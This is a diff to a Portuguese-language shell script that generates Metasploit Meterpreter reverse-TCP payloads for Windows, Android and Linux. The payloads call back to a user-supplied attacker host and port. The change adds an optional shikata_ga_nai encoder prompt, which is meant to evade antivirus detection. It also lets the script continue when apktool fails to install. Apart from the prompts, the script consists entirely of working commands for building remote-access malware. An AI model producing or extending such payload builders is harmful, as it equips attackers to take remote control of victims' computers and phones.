@@ -18,8 +18,7 @@ install_apktool() {
     if command -v apktool &> /dev/null; then
       echo "apktool instalado com sucesso."
     else
-      echo "Falha ao instalar o apktool."
-      exit 1
+      echo "Falha ao instalar o apktool. Continuando sem ele..."
     fi
   else
     echo "apktool já está instalado."
@@ -43,18 +42,29 @@ read lhost
 echo "Escolha o LPORT:"
 read lport
 
+# Perguntar se o usuário deseja usar um encoder
+echo "Deseja usar um encoder? (s/n)"
+read use_encoder
+
+# Define o encoder se o usuário escolher "s"
+if [[ $use_encoder == "s" ]]; then
+  encoder="-e x86/shikata_ga_nai"
+else
+  encoder=""
+fi
+
 case $platform in
   1)
     echo "Criando exploit Windows..."
-    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -f exe > windows_exploit.exe
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport $encoder -f exe > windows_exploit.exe
     ;;
   2)
     echo "Criando exploit Android..."
-    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -o android_exploit.apk
+    msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport $encoder -o android_exploit.apk
     ;;
   3)
     echo "Criando exploit Linux..."
-    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -e x86/shikata_ga_nai -f elf > linux_exploit.elf
+    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport $encoder -f elf > linux_exploit.elf
     ;;
   *)
     echo "Plataforma inválida. Saindo..."
